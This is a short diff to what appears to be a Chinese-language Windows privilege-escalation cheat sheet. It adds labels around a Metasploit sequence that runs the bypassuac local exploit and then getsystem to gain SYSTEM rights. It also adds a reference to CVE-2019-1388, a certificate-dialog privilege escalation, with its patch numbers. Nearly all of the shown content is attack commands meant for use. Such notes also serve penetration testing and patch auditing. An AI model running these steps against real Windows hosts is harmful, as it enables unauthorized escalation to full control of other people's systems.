@@ -92,6 +92,7 @@ https://github.com/WindowsExploits/Exploits
 
 ### bypassuac
 
+1. msf
 ```bash
 search bypassuac
 use exploit/windows/local/bypassuac
@@ -101,3 +102,4 @@ run -j
 getuid
 getsystem
 ```
+2. CVE编号:CVE-2019-1388,windwos证书对话框特权提升漏洞。补丁号KB4524235 KB4525233
